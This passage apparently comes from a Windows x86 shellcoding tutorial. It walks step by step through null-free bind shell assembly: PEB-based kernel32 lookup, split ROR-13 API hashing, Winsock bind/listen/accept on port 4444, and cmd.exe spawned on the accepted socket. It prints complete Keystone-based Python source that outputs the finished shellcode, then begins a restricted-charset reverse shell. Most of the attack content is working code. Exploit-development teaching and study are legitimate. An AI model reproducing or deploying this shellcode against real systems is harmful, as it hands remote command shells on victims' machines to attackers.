  <text x="490" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <text x="525" y="86" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="80" y="110" width="590" height="72" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="133" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Registers During rep stosb</text>
  <text x="140" y="156" text-anchor="middle" fill="#ff6b35" font-size="11">AL = 0x00</text>
  <text x="300" y="156" text-anchor="middle" fill="#ff6b35" font-size="11">ECX = 68 (0x44)</text>
  <text x="500" y="156" text-anchor="middle" fill="#ff6b35" font-size="11">EDI = destination</text>
  <text x="375" y="175" text-anchor="middle" fill="#00ff88" font-size="11">Each iteration: [EDI] = AL, EDI++, ECX-- | 2 instructions vs. 17 pushes</text>
</svg></div>

*Figure 11.5 -- rep stosb writes AL (zero) to each byte at EDI, advancing EDI and decrementing ECX until ECX reaches zero.*

### Step 10: Filling STARTUPINFOA with clientSock

After zeroing, we write the fields that matter: `cb` (struct size), `dwFlags` (STARTF_USESTDHANDLES), and the three stdio handles pointing to `clientSock`:

```nasm
struct_STARTUPINFOA:
    xor   edx, edx
    mov   dx, 0x0101
    dec   edx                     ; EDX = 0x0100 (STARTF_USESTDHANDLES)
    xor   eax, eax
    mov   eax, [ebp+0x38]        ; EAX = clientSock (from accept!)
    mov   [edi+0x40], eax         ; si.hStdError  = clientSock
    mov   [edi+0x3C], eax         ; si.hStdOutput = clientSock
    mov   [edi+0x38], eax         ; si.hStdInput  = clientSock
    mov   [edi+0x2C], edx         ; si.dwFlags = 0x100
    mov   dword ptr [edi], ecx    ; si.cb = 0x44 (68)
    xor   esi, esi
    xchg  esi, edi                ; ESI = &STARTUPINFOA, EDI freed
```

> The `mov dx, 0x0101; dec edx` trick: we cannot push `0x0100` directly (it contains a null byte in the high word). Building it from `0x0101 - 1` avoids the null.

### Step 11: Zeroing PROCESS_INFORMATION

`CreateProcessA` also needs a `PROCESS_INFORMATION` structure (16 bytes). We zero it the same way:

```nasm
zero_structs_pi:
    xor   eax, eax
    xor   ecx, ecx
    mov   cl, 0x10                ; ECX = 16 bytes
    sub   esp, ecx
    mov   edi, esp
    push  ecx
    rep   stosb                   ; zero 16 bytes
    pop   ecx
    sub   edi, ecx                ; EDI = &PROCESS_INFORMATION
```

### Step 12: Building "cmd.exe" and Calling CreateProcessA

The `"cmd.exe"` string is built using the `shl/mov` technique to construct `"exe\0"` without embedding a null byte:

```nasm
call_CreateProcessA:
    xor   edx, edx
    xor   eax, eax
    push  eax                     ; null terminator
    xor   eax, eax
    mov   ax, 0x6578              ; AX = "xe"
    shl   eax, 0x08               ; EAX = 0x00657800
    mov   al, 0x65                ; EAX = 0x00657865 = "exe\0"
    push  eax                     ; push "exe\0"
    push  0x2e646d63              ; push "cmd."
    mov   edx, esp                ; EDX -> "cmd.exe\0"
    xor   eax, eax
    push  edi                     ; lpProcessInformation
    push  esi                     ; lpStartupInfo
    push  eax                     ; lpCurrentDirectory = NULL
    push  eax                     ; lpEnvironment = NULL
    push  eax                     ; dwCreationFlags = 0
    inc   eax                     ; TRUE
    push  eax                     ; bInheritHandles = TRUE
    dec   eax
    push  eax                     ; lpThreadAttributes = NULL
    push  eax                     ; lpProcessAttributes = NULL
    push  edx                     ; lpCommandLine = "cmd.exe"
    push  eax                     ; lpApplicationName = NULL
    call  dword ptr [ebp+0x14]    ; CreateProcessA
```

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1106" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1106"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1106" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="180" rx="10" fill="url(#bg_s1106)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1106)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1106)" font-weight="bold">Building "exe\0" Without Null Bytes</text>
  <rect x="50" y="50" width="150" height="40" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="125" y="74" text-anchor="middle" fill="#ff6b35" font-size="11">mov ax, 0x6578</text>
  <text x="125" y="100" text-anchor="middle" fill="#8b949e" font-size="10">AX = "xe"</text>
  <rect x="230" y="50" width="150" height="40" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="305" y="74" text-anchor="middle" fill="#ff3366" font-size="11">shl eax, 0x08</text>
  <text x="305" y="100" text-anchor="middle" fill="#8b949e" font-size="10">EAX = 0x657800</text>
  <rect x="410" y="50" width="150" height="40" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="485" y="74" text-anchor="middle" fill="#00ff88" font-size="11">mov al, 0x65</text>
  <text x="485" y="100" text-anchor="middle" fill="#8b949e" font-size="10">EAX = 0x00657865</text>
  <rect x="590" y="50" width="120" height="40" rx="5" fill="#0d1117" stroke="#00d4ff" stroke-width="2"/>
  <text x="650" y="74" text-anchor="middle" fill="#00d4ff" font-size="11">"exe\0"</text>
  <rect x="120" y="120" width="510" height="40" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="144" text-anchor="middle" fill="#e0e7ff" font-size="11">vs. Reverse Shell: mov eax, 0xff9a879b; neg eax (NEG trick for same result)</text>
</svg></div>

*Figure 11.6 -- Two different techniques for building "exe\0" without null bytes. The bind shell uses shift-left, the reverse shell uses NEG.*

### Step 13: Calling ExitProcess

After `CreateProcessA` returns, we call `ExitProcess(0)` for a clean shutdown:

```nasm
call_ExitProcess:
    xor   eax, eax               ; EAX = 0
    push  eax                     ; uExitCode = 0
    call  dword ptr [ebp+0x18]    ; ExitProcess(0)
```

### The Split ROR-13 Trick

One subtle but critical detail in this shellcode: the hash computation uses `ror edx, 0x07; ror edx, 0x06` instead of the usual `ror edx, 0x0D`. Why? Because `0x0D` is the carriage return character (`\r`), and many protocols filter it. Splitting the rotation into `7 + 6 = 13` produces identical hashes while keeping the shellcode clean of `0x0D` bytes.

```nasm
compute_hash_again:
    lodsb                         ; load byte from [ESI] into AL
    test  al, al                  ; check for null terminator
    jz    compute_hash_finished
    ror   edx, 0x07               ; rotate right 7 bits
    ror   edx, 0x06               ; rotate right 6 bits (7+6=13)
    add   edx, eax                ; add byte to hash
    jmp   compute_hash_again
```

<div align="center"><svg viewBox="0 0 750 160" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1107" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1107"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1107" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="160" rx="10" fill="url(#bg_s1107)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1107)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1107)" font-weight="bold">Split ROR-13: Avoiding 0x0D in Shellcode</text>
  <rect x="50" y="50" width="290" height="90" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="195" y="72" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Standard (has 0x0D)</text>
  <text x="195" y="95" text-anchor="middle" fill="#e0e7ff" font-size="12">ror edx, 0x0D</text>
  <text x="195" y="118" text-anchor="middle" fill="#ff3366" font-size="10">Opcode: C1 CA 0D</text>
  <text x="195" y="132" text-anchor="middle" fill="#ff3366" font-size="10">0x0D = carriage return = BAD</text>
  <rect x="410" y="50" width="290" height="90" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="555" y="72" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Split (0x0D-free)</text>
  <text x="555" y="95" text-anchor="middle" fill="#e0e7ff" font-size="12">ror edx, 0x07 + ror edx, 0x06</text>
  <text x="555" y="118" text-anchor="middle" fill="#00ff88" font-size="10">Opcodes: C1 CA 07 C1 CA 06</text>
  <text x="555" y="132" text-anchor="middle" fill="#00ff88" font-size="10">7 + 6 = 13 -- same hash, no bad bytes</text>
</svg></div>

*Figure 11.7 -- Splitting the ROR-13 rotation into two steps avoids the 0x0D byte in the opcode stream.*

### Complete Bind Shell Flow

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1108" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1108"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1108" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1108" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1108)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1108)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1108)" font-weight="bold">Complete Bind Shell Pipeline</text>
  <rect x="10" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="46" y="68" text-anchor="middle" fill="#00d4ff" font-size="8" font-weight="bold">Resolve</text>
  <text x="46" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">kernel32</text>
  <line x1="82" y1="72" x2="92" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="95" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="131" y="68" text-anchor="middle" fill="#ff6b35" font-size="8" font-weight="bold">Load DLL</text>
  <text x="131" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">ws2_32</text>
  <line x1="167" y1="72" x2="177" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="180" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="216" y="68" text-anchor="middle" fill="#00d4ff" font-size="8" font-weight="bold">Resolve</text>
  <text x="216" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">ws2_32</text>
  <line x1="252" y1="72" x2="262" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="265" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="301" y="68" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">Startup</text>
  <text x="301" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">WSA init</text>
  <line x1="337" y1="72" x2="347" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="350" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="386" y="68" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">Socket</text>
  <text x="386" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">TCP sock</text>
  <line x1="422" y1="72" x2="432" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="435" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="471" y="68" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">Bind</text>
  <text x="471" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">port 4444</text>
  <line x1="507" y1="72" x2="517" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="520" y="50" width="72" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="556" y="68" text-anchor="middle" fill="#ff6b35" font-size="8" font-weight="bold">Listen</text>
  <text x="556" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">backlog=1</text>
  <line x1="592" y1="72" x2="602" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1108)"/>
  <rect x="605" y="50" width="130" height="45" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="670" y="68" text-anchor="middle" fill="#00ff88" font-size="8" font-weight="bold">Accept -> Shell</text>
  <text x="670" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">clientSock + cmd.exe</text>
  <rect x="50" y="115" width="650" height="65" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="138" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Bind Shell Architecture</text>
  <text x="375" y="158" text-anchor="middle" fill="#e0e7ff" font-size="11">Target opens port 4444 -> BLOCKS on accept -> attacker connects in -> shell spawns</text>
  <text x="375" y="174" text-anchor="middle" fill="#8b949e" font-size="10">Attacker: nc target_ip 4444 | Target: already listening and waiting</text>
</svg></div>

*Figure 11.8 -- The complete bind shell pipeline. Nine stages from API resolution through to the interactive shell, with a blocking accept() in the middle.*

### Full Shellcode Source (`bind_shell.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x07                 ;"  #   7 + 6 = 13 (avoid 0x0D byte)
    "   ror   edx, 0x06                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x73e2d87e                ;"  #   ExitProcess hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"

    " load_ws2_32_dll:                   "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"
    "   push  eax                       ;"
    "   push  0x642e3233                ;"
    "   push  0x5f327377                ;"
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x10]      ;"  #   LoadLibraryA("ws2_32.dll")

    " resolve_symbols_ws2_32_dll:        "
    "   mov   ebx, eax                  ;"
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0xadf509d9                ;"  #   WSASocketA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0xc7701aa4                ;"  #   bind hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"
    "   push  0xe92eada4                ;"  #   listen hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x28], eax           ;"
    "   push  0x498649e5                ;"  #   accept hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x2C], eax           ;"

    " call_WSAStartup:                   "
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x0202                ;"
    "   add   esp, 0xFFFFFE70           ;"  #   sub esp, 0x190 (null-free)
    "   push  esp                       ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x1C]      ;"

    " call_WSASocketA:                   "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   mov   al, 0x06                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x20]      ;"
    "   mov   [ebp+0x34], eax           ;"  #   listenSock

    " call_bind:                         "
    "   xor   edx, edx                  ;"
    "   inc   edx                       ;"
    "   inc   edx                       ;"  #   EDX = 2 (AF_INET)
    "   xor   esi, esi                  ;"
    "   sub   esp, 0x10                 ;"
    "   mov   esi, esp                  ;"
    "   xor   eax, eax                  ;"
    "   mov   [esi+0x08], eax           ;"  #   sin_zero = 0
    "   mov   [esi+0x04], eax           ;"  #   sin_addr = 0.0.0.0
    "   mov   ax, 0x5C11                ;"  #   port 4444 (network order)
    "   mov   word ptr [esi+0x02], ax   ;"  #   sin_port
    "   mov   word ptr [esi], dx        ;"  #   sin_family = AF_INET
    "   xor   edx, edx                  ;"
    "   mov   dl, 0x10                  ;"  #   namelen = 16
    "   push  edx                       ;"
    "   push  esi                       ;"
    "   push  dword ptr [ebp+0x34]      ;"
    "   call  dword ptr [ebp+0x24]      ;"  #   bind()

    " call_listen:                       "
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"  #   backlog = 1
    "   push  eax                       ;"
    "   push  dword ptr [ebp+0x34]      ;"
    "   call  dword ptr [ebp+0x28]      ;"  #   listen()

    " call_accept:                       "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   addrlen = NULL
    "   push  eax                       ;"  #   addr = NULL
    "   push  dword ptr [ebp+0x34]      ;"  #   listenSock
    "   call  dword ptr [ebp+0x2C]      ;"  #   accept()
    "   mov   [ebp+0x38], eax           ;"  #   clientSock (NEW handle!)

    " zero_structs:                      "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x44                  ;"  #   68 bytes
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   rep   stosb                     ;"  #   zero fill
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"

    " struct_STARTUPINFOA:               "
    "   xor   edx, edx                  ;"
    "   mov   dx, 0x0101                ;"
    "   dec   edx                       ;"  #   0x0100 = STARTF_USESTDHANDLES
    "   xor   eax, eax                  ;"
    "   mov   eax, [ebp+0x38]           ;"  #   clientSock
    "   mov   [edi+0x40], eax           ;"  #   hStdError
    "   mov   [edi+0x3C], eax           ;"  #   hStdOutput
    "   mov   [edi+0x38], eax           ;"  #   hStdInput
    "   mov   [edi+0x2C], edx           ;"  #   dwFlags
    "   mov   dword ptr [edi], ecx      ;"  #   cb = 0x44
    "   xor   esi, esi                  ;"
    "   xchg  esi, edi                  ;"

    " zero_structs_pi:                   "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x10                  ;"  #   16 bytes
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   rep   stosb                     ;"
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"

    " call_CreateProcessA:               "
    "   xor   edx, edx                  ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   null terminator
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6578                ;"  #   "xe"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x65                  ;"  #   "exe\0"
    "   push  eax                       ;"
    "   push  0x2e646d63                ;"  #   "cmd."
    "   mov   edx, esp                  ;"
    "   xor   eax, eax                  ;"
    "   push  edi                       ;"  #   lpProcessInformation
    "   push  esi                       ;"  #   lpStartupInfo
    "   push  eax                       ;"  #   lpCurrentDirectory
    "   push  eax                       ;"  #   lpEnvironment
    "   push  eax                       ;"  #   dwCreationFlags
    "   inc   eax                       ;"  #   TRUE
    "   push  eax                       ;"  #   bInheritHandles
    "   dec   eax                       ;"
    "   push  eax                       ;"  #   lpThreadAttributes
    "   push  eax                       ;"  #   lpProcessAttributes
    "   push  edx                       ;"  #   lpCommandLine
    "   push  eax                       ;"  #   lpApplicationName
    "   call  dword ptr [ebp+0x14]      ;"  #   CreateProcessA

    " call_ExitProcess:                  "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   uExitCode = 0
    "   call  dword ptr [ebp+0x18]      ;"  #   ExitProcess(0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the bind shell shellcode listening on port 4444 and accepting an incoming connection:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/bind-shell-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Bind shell accepting incoming connection*

---
## 12. Working Under Restrictions: A Case Study

What if the vulnerability filters out far more than just `0x00`? Real-world exploits often have extensive bad character lists. When half the byte range is off limits, every constant must be constructed indirectly.

This shellcode is a restricted-charset reverse shell. It uses `neg`, `xor`, and `shl` to construct every value that would otherwise contain a forbidden byte. It also introduces `WaitForSingleObject` to keep the shell alive after `CreateProcessA` returns, and uses `connect` instead of `WSAConnect`.

### Step 1: Resolving kernel32.dll Functions

We need four functions from `kernel32.dll` -- one more than the standard reverse shell:

**LoadLibraryA** Hash: `0xec0e4e8e`. Loads ws2_32.dll.

**CreateProcessA** Hash: `0x16b3fe72`. Spawns cmd.exe with stdio redirect.

**WaitForSingleObject** `DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)` Waits for a process to terminate. We pass `-1` (INFINITE) so the shellcode does not exit while the shell session is active. Hash: `0xce05d9ad`.

**ExitProcess** Hash: `0x73e2d87e`. Clean process exit after the shell session ends.

```nasm
resolve_symbols_kernel32:
    push  0xec0e4e8e              ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax         ; save LoadLibraryA

    push  0x16b3fe72              ; CreateProcessA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax         ; save CreateProcessA

    push  0xce05d9ad              ; WaitForSingleObject hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax         ; save WaitForSingleObject

    push  0x73e2d87e              ; ExitProcess hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax         ; save ExitProcess
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1201" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1201"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1201" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s1201)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1201)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1201)" font-weight="bold">Restricted Shell: kernel32.dll Resolution (4 APIs)</text>
  <rect x="30" y="50" width="280" height="200" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="170" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Variable Table</text>
  <rect x="45" y="85" width="250" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="170" y="103" text-anchor="middle" fill="#ff6b35" font-size="10">[ebp+0x10] = LoadLibraryA (0xec0e4e8e)</text>
  <rect x="45" y="119" width="250" height="28" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="170" y="137" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x14] = CreateProcessA (0x16b3fe72)</text>
  <rect x="45" y="153" width="250" height="28" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="170" y="171" text-anchor="middle" fill="#ff3366" font-size="10">[ebp+0x18] = WaitForSingleObject (0xce05d9ad)</text>
  <rect x="45" y="187" width="250" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1.5"/>
  <text x="170" y="205" text-anchor="middle" fill="#8b949e" font-size="10">[ebp+0x1C] = ExitProcess (0x73e2d87e)</text>
  <rect x="380" y="60" width="330" height="170" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="545" y="85" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">New: WaitForSingleObject</text>
  <text x="545" y="110" text-anchor="middle" fill="#e0e7ff" font-size="11">Without it, CreateProcessA returns</text>
  <text x="545" y="130" text-anchor="middle" fill="#e0e7ff" font-size="11">immediately and the shellcode exits</text>
  <text x="545" y="150" text-anchor="middle" fill="#e0e7ff" font-size="11">before the user can type commands.</text>
  <text x="545" y="178" text-anchor="middle" fill="#00ff88" font-size="11">WaitForSingleObject(-1) = INFINITE</text>
  <text x="545" y="198" text-anchor="middle" fill="#8b949e" font-size="10">Blocks until cmd.exe process terminates</text>
</svg></div>

*Figure 12.1 -- Four kernel32.dll functions. WaitForSingleObject is the key addition -- it blocks until cmd.exe exits, keeping the shell alive.*

### Step 2: Loading ws2_32.dll and Resolving Winsock Functions

The DLL loading is identical. For ws2_32.dll, we resolve three functions -- using `connect` instead of `WSAConnect` (fewer parameters, simpler):

```nasm
resolve_symbols_ws2_32_dll:
    mov   ebx, eax                ; EBX = ws2_32.dll base
    push  0x3bfcedcb              ; WSAStartup hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax         ; save WSAStartup

    push  0xadf509d9              ; WSASocketA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax         ; save WSASocketA

    push  0x60aaf9ec              ; connect hash (not WSAConnect!)
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x28], eax         ; save connect
```

